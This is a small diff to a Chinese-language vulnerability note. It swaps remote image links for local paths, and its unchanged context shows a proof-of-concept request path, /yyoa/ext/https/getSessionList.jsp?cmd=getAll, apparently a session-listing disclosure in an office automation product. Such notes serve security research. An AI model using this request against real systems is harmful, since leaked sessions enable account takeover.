@@ -20,7 +20,7 @@
 
 登录页面
 
-![image-20220520141805589](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201418731.png)
+![image-20220520141805589](./images/202205201418731.png)
 
 验证POC
 
@@ -28,4 +28,4 @@
 /yyoa/ext/https/getSessionList.jsp?cmd=getAll
 ```
 
-![image-20220520141832426](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201418464.png)
+![image-20220520141832426](./images/202205201418464.png)
